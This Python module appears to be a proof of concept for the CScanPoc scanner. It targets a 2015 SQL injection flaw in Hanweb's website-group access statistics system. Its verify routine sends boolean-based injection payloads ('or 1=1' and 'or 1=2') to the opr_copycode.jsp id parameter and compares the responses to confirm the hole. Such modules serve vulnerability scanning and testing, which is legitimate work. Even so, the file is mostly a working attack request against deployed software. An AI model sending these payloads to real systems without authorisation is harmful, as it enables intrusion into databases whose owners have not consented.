# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0011'  # 平台漏洞编号，留空
    name = '大汉网站群访问统计系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-28'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）大汉VC系统，漏洞地址：
        /vc/vc/style/opr_copycode.jsp?id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0143776'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉网站群访问统计系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '98628920-81f0-4b13-8536-5fab30561bb0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143776
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/vc/vc/style/opr_copycode.jsp?id=-1'
            getdata1 = '%20or%201%3D1'
            getdata2 = '%20or%201%3D2'
            code1, head, res1, errcode, _ = hh.http(arg + payload + getdata1)
            code2, head, res2, errcode, _ = hh.http(arg + payload + getdata2)
            m1 = re.findall('td', res1)
            m2 = re.findall('td', res2)

            if code1 == 200 and code2 == 500 and m1 != m2:
                #security_hole(arg+payload + "   :sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
